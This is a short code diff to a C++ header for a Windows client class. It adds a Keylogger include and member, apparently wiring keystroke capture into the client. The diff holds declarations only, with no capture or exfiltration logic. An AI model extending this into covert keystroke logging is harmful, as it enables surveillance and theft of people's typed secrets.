@@ -7,6 +7,7 @@
 #include <WinBase.h>
 #include <winternl.h>
 #include <ClientWindow.h>
+#include <Keylogger.hh>
 
 class				Client
 {
@@ -23,6 +24,8 @@ public:
 
 private:
 	ClientWindow	_window;
+	Keylogger		_keylogger;
+	MSG				_msg;
 	bool			_running;
 	bool			_assholeMode;
 };
